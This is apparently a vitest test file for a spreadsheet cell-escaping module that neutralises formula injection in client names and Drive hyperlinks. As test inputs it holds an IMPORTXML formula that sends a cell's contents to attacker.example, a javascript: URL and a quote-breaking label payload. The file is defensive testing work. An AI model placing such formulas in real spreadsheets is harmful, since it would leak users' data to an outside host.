/**
 * Formula-injection escaping — the highest-risk item in Phase 11.
 *
 * A tracking sheet is opened by staff every day. A cell that begins with `=`
 * runs when they open it, so a client name is executable input unless something
 * stops it being one.
 */

import { describe, expect, it } from 'vitest';

import { driveHyperlink, safeNumber, safeText, MAX_CELL_LENGTH } from './cell-escaping';

const FOLDER_URL = 'https://drive.google.com/drive/folders/test-only-folder-1';

describe('escaping', () => {
  it('neutralises a formula in a client name', () => {
    const attack = '=IMPORTXML("https://attacker.example/log?d="&A2,"//x")';

    // A leading apostrophe is Sheets' own "this cell is text" marker.
    expect(safeText(attack)).toBe(`'${attack}`);
  });

  it('escapes every leading character that starts a formula', () => {
    for (const prefix of ['=', '+', '-', '@']) {
      const value = `${prefix}SUM(A1:A9)`;
      expect(safeText(value), value).toBe(`'${value}`);
    }
  });

  it('leaves an ordinary value alone', () => {
    for (const value of ['Acme Trading Co.', '2026-08-11', 'SFC/RUH/QTN/2026/004', '']) {
      expect(safeText(value), value).toBe(value);
    }
  });

  it('escapes after trimming, so leading whitespace is not a bypass', () => {
    expect(safeText('   =SUM(A1)')).toBe("'=SUM(A1)");
  });

  it('caps the length', () => {
    const long = 'a'.repeat(MAX_CELL_LENGTH + 500);
    expect(safeText(long)).toHaveLength(MAX_CELL_LENGTH);
    expect(safeText('a'.repeat(50), 10)).toHaveLength(10);
  });

  it('turns a non-string into an empty cell rather than "[object Object]"', () => {
    expect(safeText(null)).toBe('');
    expect(safeText(undefined)).toBe('');
  });
});

describe('numbers', () => {
  it('writes a real number, so the column sorts and totals', () => {
    // A string of digits sorts lexicographically: 9,000 above 10,000.
    expect(safeNumber(24_150.5)).toBe(24_150.5);
    expect(typeof safeNumber(0)).toBe('number');
  });

  it('writes an empty cell for a value that is not a number', () => {
    expect(safeNumber(Number.NaN)).toBe('');
    expect(safeNumber(Number.POSITIVE_INFINITY)).toBe('');
  });
});

describe('the Drive Folder hyperlink', () => {
  it('builds a HYPERLINK for a real Drive URL', () => {
    expect(driveHyperlink(FOLDER_URL, 'SFC/RUH/QTN/2026/004')).toBe(
      `=HYPERLINK("${FOLDER_URL}","SFC/RUH/QTN/2026/004")`,
    );
  });

  it('writes anything else as inert text', () => {
    // The one formula this system emits must never be built from a URL that is
    // not Drive's — that is how a formula becomes an arbitrary payload.
    for (const url of [
      'https://attacker.example/x',
      'http://drive.google.com/x',
      'javascript:' + 'alert(1)',
      '',
    ]) {
      const cell = driveHyperlink(url, 'label');
      expect(String(cell).indexOf('=HYPERLINK'), url).toBe(-1);
    }
  });

  it('escapes a quote in the label rather than letting it end the argument', () => {
    const cell = String(driveHyperlink(FOLDER_URL, 'a" & IMPORTXML("x'));

    expect(cell).toContain('a"" & IMPORTXML(""x');
    // Exactly two arguments: the injection did not open a third.
    expect(cell.split('","')).toHaveLength(2);
  });

  it('strips newlines from the label', () => {
    expect(String(driveHyperlink(FOLDER_URL, 'a\nb'))).toContain('"a b"');
  });
});
